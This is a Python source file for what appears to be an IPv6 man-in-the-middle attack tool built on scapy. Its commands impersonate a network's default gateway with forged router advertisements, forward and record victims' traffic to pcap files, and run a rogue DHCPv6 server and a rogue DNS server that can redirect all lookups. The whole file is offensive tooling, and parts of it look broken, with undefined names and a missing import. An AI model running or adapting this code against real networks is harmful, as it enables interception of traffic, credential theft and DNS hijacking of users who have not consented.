import click
import time
from scapy.all import *
from scapy.all import IPv6,ICMPv6ND_NA,ICMPv6ND_RA,ICMPv6ND_NS,ICMPv6ND_Redirect,ICMPv6NDOptSrcLLAddr,UDP,DHCP6_Advertise,DHCPv6_am,Ether,ICMPv6NDOptRDNSS,RandMAC,DNS,DNSRR,DNSQR,LLMNRQuery, PcapWriter
from scapy.all import send,srp1,sniff,sendp,conf,get_if_hwaddr,read_routes6
import os
import subprocess
import threading
import regex
import dhcpAM
import ipaddress
import random
import socket


class Device:
    def __init__(self, linklocal = "", globalip = "", macaddr = ""):
        self.linklocal = linklocal
        self.globalip = globalip
        self.macaddr = macaddr

class FakeGateway(Device):
    def AddTarget(self,target):
        self.targetDevice = target
        self.pcap = PcapWriter(f"{self.linklocal}",append=True,sync=True)
    def Write(self,packet):
        self.pcap.write(packet)


targets = []
myDevice = Device()
gatewayDev = Device()
fakeGateways = []

dhcpM = DHCPv6_am()

def sendNA(source,destination,interface=conf.iface):
    p = (IPv6(src=source,dst=destination)/ICMPv6ND_NA(tgt=destination,R=1,S=1,O=1)/ ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(iff=interface)))
    p.show()
    send(p,iface=interface)

def sendRA(interface,gw):
    while True:
        send(IPv6(src=gw,dst=targets[1].linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)
        send(IPv6(src=myDevice.linklocal, dst=targets[1].linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
        time.sleep(2)

def Revert(interface,gw):
        send(IPv6(src=gw,dst=targets[1].linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
        send(IPv6(src=myDevice.linklocal, dst=targets[1].linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)

def clearRouter(target,gw):
    send(IPv6(src=gw,dst=target)/ICMPv6ND_RA(routerlifetime=0))

def Redirect(target,gw,interface):
    p = (IPv6(src=target,dst=gw)/ICMPv6ND_Redirect(tgt=target,dst=gw))
    send(p,iface=interface, loop=1, inter=0.1,verbose=0)

def get_target_mac(target,interface):
    print(myDevice.linklocal)
    r = srp1(IPv6(src=myDevice.linklocal,dst=target)/ICMPv6ND_NS(tgt=target),iface=interface,verbose=0)
    return r.getlayer(Ether).src

def forwarder(fakegateway):
    while True:
        p = sniff(count=1,filter="ip6 && inbound")

        if p[0].getlayer(Ether).src == fakegateway.targetDevice.macaddr or p[0].getlayer(IPv6).src == fakegateway.targetDevice.linklocal:
            p[0].getlayer(Ether).src = fakegateway.macaddr
            p[0].getlayer(Ether).dst = gatewayDev.macaddr
            p[0].getlayer(IPv6).src = fakegateway.linklocal
            sendp(p,iface=conf.iface,verbose=0)
            fakegateway.Write(p[0])

        if p[0].getlayer(Ether).dst == fakegateway.macaddr or p[0].getlayer(IPv6).dst == fakegateway.linklocal:
            p[0].getlayer(Ether).src = fakegateway.macaddr
            p[0].getlayer(Ether).dst = gatewayDev.macaddr
            p[0].getlayer(IPv6).dst = gatewayDev.linklocal
            sendp(p,iface=conf.iface,verbose=0)
            fakegateway.Write(p[0])


def DHCPadvertise(interface,targets = ['ff02::1']):
    while True:
        for target in targets:
            send(IPv6(dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0,M=1,O=1),iface=interface,verbose=0)
        time.sleep(5)

def DNSadvertise(interface,targets = ['ff02::1']):
    while True:
        for target in targets:
            send(IPv6(dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0)/ICMPv6NDOptRDNSS(dns=[myDevice.globalip]),iface=interface,verbose=0)
        time.sleep(5)

def matchIPv6(addr):
    try:
        ip = ipaddress.IPv6Address(addr)
        return True
    except:
        return False

#def wellcomeMsg():
#    return("\n___  ________ ________  ___       _____ _____  _____ _     \n|  \/  |_   _|_   _|  \/  |      |_   _|  _  ||  _  | |    \n| .  . | | |   | | | .  . |  ______| | | | | || | | | |    \n| |\/| | | |   | | | |\/| | |______| | | | | || | | | |    \n| |  | |_| |_  | | | |  | |        | | \ \_/ /\ \_/ / |____  by CrumblyBread\n\_|  |_/\___/  \_/ \_|  |_/        \_/  \___/  \___/\_____/\n")

def get_linklocal(interface):
    r = read_routes6()
    for line in r:
        print(line)
        if line[3] == interface and regex.match("^fe80:.+",line[0]) and matchIPv6(line[0]):
            print(str(line[4][0]))
            return(str(line[4][0]))

def get_global(interface):
    r = read_routes6()
    for line in r:
        if line[3] == interface and not regex.match("^fe80:.+",line[0]) and matchIPv6(line[0]):
            return(str(line[4][0]))

def get_target_global(target):
    r = socket.getnameinfo((target.linklocal,0), 0)
    sendLLMNR(r[0])



def source_in_targets(targets, source):
    for target in targets:
        if target.linklocal == source:
            return True
    return False

def get_random_mac():
    rmac = RandMAC()
    #TODO: Add more OUIs
    return "44:38:39" + str(rmac)[8:]

def linklocalFromMAC(mac):
    macs = str(mac).split(":")
    macs.insert(3,"fe")
    macs.insert(3,"ff")
    macs[0] = str(hex(int(macs[0],16) ^ int("2",16)))[2:]
    linklocal="fe80:"
    for x in range(len(macs)):
        if(x % 2 == 0):
            linklocal += ":"
        linklocal +=  macs[x]
    return linklocal

def sendMDNS(hostname):
    trid = random.randint(0,33000)
    p = IPv6(dst="ff02::fb")/UDP(dport=5353)/DNS(id=trid,qd=DNSQR(qtype="AAAA", qname=f"{hostname}.local"))
    #p.show()
    send(p)
    while True:
        r = sniff(count=1)
        if r[0].haslayer(DNSRR) and r[0].getlayer(DNS).id == trid:
            r[0].show()
            break
def sendLLMNR(hostname):
    trid = random.randint(0,33000)
    p = IPv6(dst="ff02::1:3")/UDP(dport=5355)/LLMNRQuery(id=trid,qd=DNSQR(qtype="PTR", qname=f"{getReverseDNS(hostname)}"))
    p.show()
    send(p)
    r = sniff(filter = 'dst port 5355',count=1)
    r[0].summary()
    if r[0].haslayer(LLMNRResponse) and r[0].getlayer(LLMNRResponse).id == trid:
        r[0].show()


def getReverseDNS(targetIp):
    revIP = ""
    parts = str(targetIp).split(":")
    while len(parts) <= 8:
        for x in range(len(parts)):
            if parts[x] == "":
                parts.insert(x,"0000")
                break
    try:
        parts.remove("")
    except:
        pass

    print(parts)

    for x in range(len(parts)):
        while len(parts[x]) < 4:
            parts[x] = "0" + parts[x]
        revIP += parts[x]
    revIP = revIP[::-1]
    revIP = [*revIP]
    for x in range(len(revIP)*2):
        if x % 2 == 0:
            revIP.insert(x+1,".")
    revIP = ''.join(str(x) for x in revIP)
    return(revIP + "ip6.arpa")

def DHCPanswer(dns,networkAddress,prefix,interface):

    network = ipaddress.ip_network(f"{networkAddress}/{prefix}")
    firstaddress = network.network_address + 1
    lastaddress = network.broadcast_address - 1

    dhcpM = dhcpAM.DHCPv6_am(dns=dns, startip=firstaddress, endip=lastaddress, iface=interface)

    while True:
        p = sniff(filter=dhcpM.filter,count=1)
        p.show()
        if source_in_targets(targets,p[0].getlayer(IPv6).src) and dhcpM.is_request(p[0]):
            r = dhcpM.make_reply(p[0])
            r.show()
            send(r,iface=interface)

def processTargetsFile(targetsfile,interface):
    if not os.path.exists(targetsfile):
        raise LookupError(f"{targetsfile}\nFile with targets does not exist")

    with open(targetsfile) as file:
        lines = [line.rstrip() for line in file]
        for l in lines:
            if matchIPv6(l) and regex.match("^fe80:.+",l):
                print(l)
                dev = Device(l,"",get_target_mac(l,interface))
                targets.append(dev)

def processDndFile(dnsfile):
    if not os.path.exists(dnsfile):
        raise FileNotFoundError(f"{dnsfile}\nFile with DNS does not exist")

    match = {}

    with open(dnsfile) as file:
        lines = [line.rstrip() for line in file]
        for line in lines:
            words = line.split(" ")
            for x in range(1,len(words)):
                match[words[x]] = (f"127.0.0.1",f"{words[0]}")

    print(match)
    return match

def DNSanswer(interface,joker,dnsfile):
    if joker == None:
        joker = False
    elif joker:
        with open(dnsfile) as file:
            lines = [line.rstrip() for line in file]
            jk = lines[0].split(" ")[0]
            if matchIPv6(jk):
                joker = jk

    dnsM = dnsAM.DNS_am(iface=interface,joker6=joker,match=processDndFile(dnsfile))

    while True:
        p = sniff(filter=f"{dnsM.filter} && ip6 && inbound",count=1)
        #source_in_targets(targets,p[0].getlayer(IPv6).src) and
        if dnsM.is_request(p[0]):
            r = dnsM.make_reply(p[0])
            #r.show()
            send(r,iface=interface)


@click.group
def mode_commands():
    pass

@click.command()
@click.option("-i","--interface", prompt="Ineterface for the network", help="Interface of the network")
@click.option("-T","--TargetsFile", help="File with ll addresses of targets",default=None)
@click.option("-t","--target", help="Target IPv6 address", default=None)
@click.option("-gw", "--gateway", prompt="Enter the default gateway", help="The default gateway to impersonate")
@click.option("-p","-pcap", is_flag=True, help="Write the traffic into a pcap file")
def gateway(target,targetsfile,gateway,interface,pcap):

    conf.iface = interface
    myDevice.linklocal = get_linklocal(interface=conf.iface)
    myDevice.globalip = get_global(interface)
    myDevice.macaddr = get_if_hwaddr(iff=interface)

    if targetsfile == None and target == None:
        raise SyntaxError("No valid target found, please use the -t or -T options")
    elif target == None:
        processTargetsFile(targetsfile,interface)
    else:
        #TODO: Get global ip
        d = Device(macaddr = get_target_mac(target,interface), linklocal = target,globalip="")
        targets.append(d)

    if not matchIPv6(target):
        print(f"\"{target}\" is not a valid IPv6 address")
        return

    if not matchIPv6(gateway):
        print(f"\"{gateway}\" is not a valid IPv6 address")
        return

    global gatewayDev
    gatewayDev.macaddr = get_target_mac(gateway,interface)
    gatewayDev.linklocal = gateway

    if not matchIPv6(myDevice.linklocal):
        print(f"\"{myDevice.linklocal}\" is not a valid IPv6 address")
        return

    try:
        if subprocess.Popen(['sudo','cat','/proc/sys/net/ipv6/conf/all/forwarding'], stdout = subprocess.PIPE).communicate()[0] == b'1\n':
            os.system("sudo echo '0' | sudo tee -a /proc/sys/net/ipv6/conf/all/forwarding")
    except:
        pass

    threading.Thread(target=sendRA,daemon=True,args=(interface,gateway)).start()

    for t in targets:
        mac = get_random_mac()
        d = FakeGateway(linklocal=linklocalFromMAC(mac),macaddr=mac)
        d.AddTarget(t)
        fakeGateways.append(d)
        threading.Thread(target=forwarder,daemon=True, args=(d)).start()

    input()
    Revert(interface=interface,gw=gateway)
    print("Quitting")

@click.command()
@click.option("-i","--interface", prompt="Ineterface for the network", help="Interface you want to connect to")
@click.option("-T","--TargetsFile", help="Filepath to list of targets to give addresses",type=click.Path())
@click.option("-n", "--networkAddress", help="First avalible address",default="2001:db9::1")
@click.option("-prefix", "--prefix", help="Last avalible address",default="2001:db9::ffff:ffff:ffff:ffff")
@click.option("-dns", help="Address of DNS server",default="2001:500::1035")
def dhcp(interface,targetsfile,networkAddress,prefix,dns):
    conf.iface = interface
    myDevice.linklocal = get_linklocal(interface=conf.iface)
    myDevice.globalip = get_global(interface)
    myDevice.macaddr = get_if_hwaddr(iff=interface)

    processTargetsFile(targetsfile,interface)

    threading.Thread(target=DHCPadvertise,daemon=True,args=(interface,targets)).start()
    threading.Thread(target=DHCPanswer,daemon=True,args=(dns,networkAddress,prefix,interface)).start()

    input()
    print("Quitting")

@click.command()
@click.option("-i","--interface", prompt="Ineterface for the network", help="Interface you want to connect to")
@click.option("-T","--TargetsFile", prompt="Filepath to the list of targets", help="Filepath to list of targets to provide dns",type=click.Path())
@click.option("-dns","--DnsFile", prompt="Filepath to dns file", help="Filepath to a dns translation file",type=click.Path())
@click.option("-joker", is_flag=True, help="Redirect all queries to the first address in DNS File")
def dns(interface,targetsfile,dnsfile,joker):
    conf.iface = interface
    myDevice.linklocal = get_linklocal(interface=conf.iface)
    myDevice.globalip = get_global(interface)
    myDevice.macaddr = get_if_hwaddr(iff=interface)

    processTargetsFile(targetsfile,interface)

    threading.Thread(target=DNSadvertise,daemon=True,args=(interface,targets)).start()
    threading.Thread(target=DNSanswer,daemon=True,args=(interface,joker,dnsfile)).start()

    input()
    print("Quitting")


@click.command()
@click.option("-t","--target", help="Target IPv6 address", default=None)
def helper(target):
    conf.iface = "ens33"
    conf.route6.routes = (r6 for r6 in conf.route6.routes if r6[3] == conf.iface)
    r = sniff(iface='ens33', prn=lambda p: p.summary(), store=0)
    r.summary()
    sendLLMNR(target)
    #print(ipaddress.ip_network(f"{target}").broadcast_address)
    #print(socket.getnameinfo((target, 0), 0))
    #dev = Device(linklocal=target)
    #get_target_global(dev)


mode_commands.add_command(helper)
mode_commands.add_command(gateway)
mode_commands.add_command(dhcp)
mode_commands.add_command(dns)

if __name__ == "__main__":
     mode_commands()
